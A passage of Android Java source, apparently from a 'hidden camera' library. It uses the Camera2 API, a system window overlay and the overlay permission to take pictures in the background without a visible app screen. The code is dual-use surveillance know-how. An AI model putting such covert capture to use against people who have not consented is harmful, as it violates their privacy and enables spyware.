            pictureCapturingListener.onCaptureError(error);
        }
        removeWindowOverlay();
        closeCamera();
    }


    /**
     * Helper methods defined below
     */
    private String getCameraId(int lens) throws Exception {
        for (String cameraId : manager.getCameraIdList()) {
            CameraCharacteristics cameraCharacteristics = manager.getCameraCharacteristics(cameraId);
            if (cameraCharacteristics.get(CameraCharacteristics.LENS_FACING) == lens) {
                return cameraId;
            }
        }
        throw new Exception("Camera lens " + lens + " not recognized");
    }

    /*
     * Background handler
     * */
    public void startBackgroundThread() {
        mBackgroundHandlerThread = new HandlerThread("HiddenCamera2Image");
        mBackgroundHandlerThread.start();
        mBackgroundHandler = new Handler(mBackgroundHandlerThread.getLooper());
    }

    public void stopBackgroundThread() {
        mBackgroundHandlerThread.quitSafely();
        try {
            mBackgroundHandlerThread.join();
            mBackgroundHandlerThread = null;
            mBackgroundHandler = null;
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
    }

    /*
     * TextureView
     * */

    public void addWindowOverlay() {
        if (this.getParent() != null) {
            ((ViewGroup) this.getParent()).removeView(this);
        }
        setLayoutParams(new ViewGroup.LayoutParams(previewWidth, previewHeight));

        WindowManager.LayoutParams winParams = new WindowManager.LayoutParams(previewWidth, previewHeight, Utils.WindowOverlayType(), Utils.WIN_FLAG_TOUCH_OUTSIDE, PixelFormat.RGBA_8888);
        winParams.gravity = Gravity.END | Gravity.BOTTOM;
        windowManager.addView(this, winParams);
    }

    public void removeWindowOverlay() {
        try {
            windowManager.removeView(this);
        } catch (Exception ignored) {
        }
    }

    /*
     * Check permissions
     * */
    private boolean checkDrawOverOtherAppsPermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(context)) {
            try {
                mainHandler.post(new Runnable() {
                    @Override
                    public void run() {
                        Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:" + context.getPackageName()));
                        intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                        context.startActivity(intent);
                    }
                });
            } catch (Exception ignored) {
            }
            return false;
        }
        return true;
    }

    /*
     * Choose best image size supported by a camera
     * */
    private static Size chooseBestSize(Size[] choices) {
        if (choices != null && choices.length > 0) {
            return choices[0];
        } else {
            return new Size(640, 480);
        }
    }

    /**
     * Given {@code choices} of {@code Size}s supported by a camera, choose the smallest one that
     * is at least as large as the respective texture view size, and that is at most as large as the
     * respective max size, and whose aspect ratio matches with the specified value. If such size
     * doesn't exist, choose the largest one that is at most as large as the respective max size,
     * and whose aspect ratio matches with the specified value.
     *
     * @param choices           The list of sizes that the camera supports for the intended output
     *                          class
     * @param textureViewWidth  The width of the texture view relative to sensor coordinate
     * @param textureViewHeight The height of the texture view relative to sensor coordinate
     * @param aspectRatio       The aspect ratio
     * @return The optimal {@code Size}, or an arbitrary one if none were big enough
     */
    private static Size chooseOptimalSize(Size[] choices, int textureViewWidth, int textureViewHeight, Size aspectRatio) {
        // Collect the supported resolutions that are at least as big as the preview Surface
        List<Size> bigEnough = new ArrayList<>();
        int w = aspectRatio.getWidth();
        int h = aspectRatio.getHeight();
        for (Size option : choices) {
            if (option.getHeight() == option.getWidth() * h / w &&
                    textureViewWidth > 0 && textureViewHeight > 0 &&
                    option.getWidth() >= textureViewWidth && option.getHeight() >= textureViewHeight) {
                bigEnough.add(option);
            }
        }

        // Pick the smallest of those big enough. If there is no one big enough, pick the
        // largest of those not big enough.
        if (bigEnough.size() > 0) {
            return Collections.min(bigEnough, new CompareSizeByArea());
        } else {
            return choices[0];
        }
    }

    private static class CompareSizeByArea implements Comparator<Size> {
        @Override
        public int compare(Size lhs, Size rhs) {
            return Long.signum(((long) lhs.getWidth() * lhs.getHeight()) - ((long) rhs.getWidth() * rhs.getHeight()));
        }
    }

    public static boolean hasCameras(@NonNull Context context) {
        PackageManager manager = context.getPackageManager();
        // There's also FEATURE_CAMERA_EXTERNAL , should we support it?
        return manager.hasSystemFeature(PackageManager.FEATURE_CAMERA_ANY)
                || manager.hasSystemFeature(PackageManager.FEATURE_CAMERA_FRONT);
    }

    private static void log(String msg) {
        Log.e(TAG, msg);
    }

}